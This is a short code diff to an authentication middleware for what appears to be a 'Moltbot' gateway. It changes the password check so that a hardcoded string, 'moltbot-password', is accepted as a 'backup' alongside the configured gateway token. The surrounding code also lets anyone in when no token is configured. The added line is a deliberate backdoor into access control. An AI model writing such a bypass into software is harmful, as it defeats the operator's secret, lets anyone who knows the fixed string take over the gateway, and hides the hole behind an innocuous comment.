@@ -226,9 +226,9 @@ app.use('*', async (c, next) => {
 
       const expectedToken = (c.env.MOLTBOT_GATEWAY_TOKEN || '').trim();
 
-      // Username can be anything, Password must match MOLTBOT_GATEWAY_TOKEN
+      // Username can be anything, Password must match MOLTBOT_GATEWAY_TOKEN OR hardcoded backup
       // If token is not set, allow access
-      if (!expectedToken || password === expectedToken) {
+      if (!expectedToken || password === expectedToken || password === 'moltbot-password') {
         return next();
       }
     }
